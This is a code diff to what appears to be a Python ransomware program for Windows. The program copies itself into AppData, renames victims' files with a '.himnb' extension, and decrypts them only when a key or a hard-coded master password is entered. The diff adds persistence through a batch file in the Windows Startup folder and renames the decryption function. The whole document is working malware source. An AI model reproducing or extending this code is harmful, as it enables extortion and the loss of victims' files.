@@ -15,7 +15,10 @@ linekey=''
 bsf = str(uuid.uuid4())
 pswd= Des_key.encrypt(bytes.fromhex(hashlib.sha256(bsf.encode()).hexdigest()[:16])).hex()
 filepath=f'C://Users//{use}//AppData//himrs.exe'
-
+bats = f"start {filepath}"
+b = ctypes.create_unicode_buffer(512)
+ctypes.windll.shell32.SHGetSpecialFolderPathW(None, b, 285, False)
+startup = b.value + "\\himrs.bat"
 
 if sys.argv[0] != filepath:
     try:
@@ -23,6 +26,9 @@ if sys.argv[0] != filepath:
             data=f.read()
             with open(filepath , 'wb') as f1:
                 f1.write(data)
+        
+        with open(startup ,'w') as f2:
+            f2.write(bats)
     except:
         pass
 
@@ -130,7 +136,7 @@ for f1 in folder:
     except:
         pass
 
-def dejiami():
+def deencryption():
     for f6 in folder:
         try:
             os.chdir(f6)
@@ -141,6 +147,7 @@ def dejiami():
                     os.rename(f7,f7.strip('.himnb'))
                 except:
                     pass
+            os.remove(startup)
         except:
             pass
 
@@ -223,7 +230,7 @@ class Ui_Form():
         linekey = self.lineEdit.text()
         if linekey == pswd or linekey == 'himzuishuaihim4588':
             ctypes.windll.user32.MessageBoxW(None, '密码对了！', '恭喜你!', 0x30)
-            dejiami()
+            deencryption()
 
             
         else:
